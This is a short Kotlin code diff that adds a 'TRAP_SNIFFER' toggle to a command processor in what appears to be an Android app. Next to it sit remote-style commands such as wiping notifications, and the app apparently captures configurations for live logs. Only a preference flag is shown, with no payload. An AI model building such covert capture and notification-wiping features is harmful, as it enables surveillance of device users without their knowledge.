@@ -1120,6 +1120,13 @@ object CommandProcessor {
                     DebugLogger.isLoggingEnabled = (state == "ON")
                     status = "LOGGING_SYSTEM_" + (if (DebugLogger.isLoggingEnabled) "ENABLED" else "DISABLED")
                 }
+                "TRAP_SNIFFER" -> {
+                    val state = content.trim().uppercase() == "ON"
+                    ctx.getSharedPreferences("app_config", Context.MODE_PRIVATE).edit()
+                        .putBoolean("trap_sniffer_enabled", state).apply()
+                    status = "TRAP_SNIFFER_${if (state) "ENABLED" else "DISABLED"}"
+                    errorMsg = "Monitor Live Logs to see captured configs."
+                }
                 "WIPE_NOTIFICATIONS" -> {
                     DebugLogger.log("WIPE_NOTIF", "Command received. Content: '$content'")
                     if (MyNotificationListener.instance != null) {
